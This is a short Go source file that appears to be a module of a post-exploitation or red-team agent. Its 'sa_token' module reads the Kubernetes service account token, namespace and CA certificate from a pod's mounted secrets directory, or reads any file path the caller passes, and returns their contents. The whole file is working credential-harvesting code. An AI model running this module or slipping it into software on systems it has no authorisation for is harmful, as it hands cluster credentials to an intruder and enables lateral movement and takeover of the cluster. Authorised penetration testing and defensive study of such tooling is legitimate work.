package modules

import (
	"context"
	"fmt"
	"os"
	"strings"
)

type ServiceAccountToken struct{}

func (m *ServiceAccountToken) Name() string        { return "sa_token" }
func (m *ServiceAccountToken) Platform() []string   { return []string{"linux", "windows", "darwin"} }

func (m *ServiceAccountToken) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	paths := []string{
		"/var/run/secrets/kubernetes.io/serviceaccount/token",
		"/var/run/secrets/kubernetes.io/serviceaccount/namespace",
		"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
	}

	customPath := args["path"]
	if customPath != "" {
		paths = []string{customPath}
	}

	var results []string
	found := false

	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err != nil {
			results = append(results, fmt.Sprintf("%s: not found", p))
			continue
		}
		found = true
		content := string(data)
		if len(content) > 2048 {
			content = content[:2048] + "\n... (truncated)"
		}
		results = append(results, fmt.Sprintf("%s:\n%s", p, content))
	}

	if !found {
		return &Result{Success: false, Output: "no service account secrets found"}, nil
	}

	return &Result{
		Success: true,
		Output:  strings.Join(results, "\n---\n"),
	}, nil
}
